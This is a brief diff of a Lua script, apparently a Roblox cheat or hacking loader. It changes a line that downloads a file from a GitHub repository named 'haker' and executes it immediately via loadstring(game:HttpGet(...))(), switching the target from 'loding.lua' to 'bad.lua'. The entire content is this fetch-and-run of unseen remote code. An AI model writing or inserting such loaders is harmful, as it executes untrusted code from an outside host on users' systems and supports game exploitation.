@@ -13,4 +13,4 @@ if shared.FutureDeveloper then
     return
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/apple246680/haker/main/loding.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/apple246680/haker/main/bad.lua"))()
